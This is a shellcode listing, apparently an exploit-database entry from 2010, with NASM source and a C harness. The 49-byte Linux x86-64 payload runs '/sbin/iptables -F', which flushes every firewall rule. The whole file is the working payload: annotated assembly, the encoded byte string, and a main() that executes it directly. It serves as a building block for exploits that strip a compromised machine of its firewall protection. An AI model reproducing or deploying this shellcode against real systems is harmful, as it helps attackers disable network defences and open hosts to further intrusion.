/*
    Title: Linux/x86-64 - execve("/sbin/iptables", ["/sbin/iptables", "-F"], NULL) - 49 bytes
    Author: 10n1z3d <10n1z3d[at]w[dot]cn>
    Date: Fri 09 Jul 2010 03:26:12 PM EEST


    Source Code (NASM):

    section .text
        global _start

    _start:
        xor     rax, rax
        push    rax
        push    word 0x462d
        mov     rcx, rsp

        mov     rbx, 0x73656c626174ffff
        shr     rbx, 0x10
        push    rbx
        mov     rbx, 0x70692f6e6962732f
        push    rbx
        mov     rdi, rsp

        push    rax
        push    rcx
        push    rdi
        mov     rsi, rsp

        ; execve("/sbin/iptables", ["/sbin/iptables", "-F"], NULL);
        mov     al, 0x3b
        syscall
*/

#include <stdio.h>

char shellcode[] = "\x48\x31\xc0\x50\x66\x68\x2d\x46\x48\x89\xe1\x48\xbb\xff\xff"
                   "\x74\x61\x62\x6c\x65\x73\x48\xc1\xeb\x10\x53\x48\xbb\x2f\x73"
                   "\x62\x69\x2f\x69\x70\x53\x48\x89\xe7\x50\x51\x57\x48\x89\xe6"
                   "\xb0\x3b\x0f\x05";

int main()
{
    printf("Length: %d bytes.\n'", strlen(shellcode));
    (*(void(*)()) shellcode)();

    return 0;
}